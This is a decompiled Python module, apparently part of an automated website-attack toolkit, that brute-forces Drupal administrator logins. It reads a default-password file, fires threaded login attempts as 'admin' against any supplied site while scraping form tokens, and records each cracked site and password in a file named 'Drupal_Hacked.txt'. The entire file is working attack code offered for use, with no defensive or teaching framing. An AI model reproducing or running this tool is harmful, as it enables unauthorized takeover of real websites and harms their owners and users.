# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: BruteForce\Drupal.py
import requests
import re
import threading
import time
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
passwords = open('files/DefaultPasswords_Drupal.txt', 'r').read().splitlines()

class DrupalBruteForce(object):

    def __init__(self):
        self.flag = 0
        self.password = passwords

    def Run(self, site):
        thread = []
        for passwd in self.password:
            t = threading.Thread(target=self.Drupal, args=(site, passwd))
            if self.flag == 1:
                break
            else:
                t.start()
                thread.append(t)
                time.sleep(0.08)

        for j in thread:
            j.join()

        if self.flag == 0:
            return printModule.returnNo(site, 'N/A', 'Drupal Bruteforce', 'Drupal')
        else:
            return printModule.returnYes(site, 'N/A', 'Drupal Bruteforce', 'Drupal')

    def Drupal(self, site, passwd):
        try:
            agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
            sess = requests.session()
            GetToken = sess.get('http://' + site + '/user/login', timeout=5, headers=agent)
            GetTokeBuld = re.findall('name="form_build_id" value="(.*)"', str(GetToken.content))[0]
            GetNameform = re.findall('name="form_id" value="(.*)"', str(GetToken.content))[0]
            PostData = {'name': 'admin',
               'pass': passwd,
               'form_build_id': GetTokeBuld,
               'form_id': GetNameform,
               'op': 'Log+in'
               }
            url = 'http://' + site + '/user/login'
            GoT = sess.post(url, data=PostData, headers=agent, timeout=10)
            if 'Log out' in str(GoT.content) and 'edit' in str(GoT.content):
                with open('result/Drupal_Hacked.txt', 'a') as writer:
                    writer.write('http://' + site + '/user/login' + '\n Username: admin' + '\n Password: ' + passwd + '\n-----------------------------------------\n')
                self.flag = 1
        except:
            pass